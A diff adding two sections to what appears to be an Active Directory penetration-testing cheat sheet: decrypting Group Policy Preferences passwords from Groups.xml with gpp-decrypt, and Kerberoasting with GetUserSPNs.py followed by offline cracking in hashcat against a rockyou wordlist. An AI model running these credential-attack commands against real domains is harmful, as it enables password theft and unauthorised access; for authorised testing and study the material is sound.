@@ -300,6 +300,31 @@ reg.py <domain>/<valid username with domain> -hashes '<LMHASH:NTHASH>' query -ke
 # Registry Root Keys: HKCR, HKCU, HKLM, HKU, HKCC
 ```
 
+### :open_file_folder: GGP
+
+Groups.xml
+
+```
+gpp-decrypt <Groups.xml cpassword strings>
+```
+
+### :open_file_folder: Kerberoasting
+
+service logon account with SPN services
+
+```
+# valid domain credentials
+python3 GetUserSPNs.py <domain>/<username>:<password> -dc-ip <target ip> 
+```
+
+```
+python3 GetUserSPNs.py <domain>/<username>:<password> -dc-ip <target ip> -request -output <hashfile>
+```
+
+```
+hashcat -a 0 -m 13100 <hashfile> ~/Documents/rockyou.txt       
+```
+
 ### :open_file_folder: Test Environment
 
 First we have to set up AD server, we can use the evaluation edition of windows sever. I chose to download the VHD version.
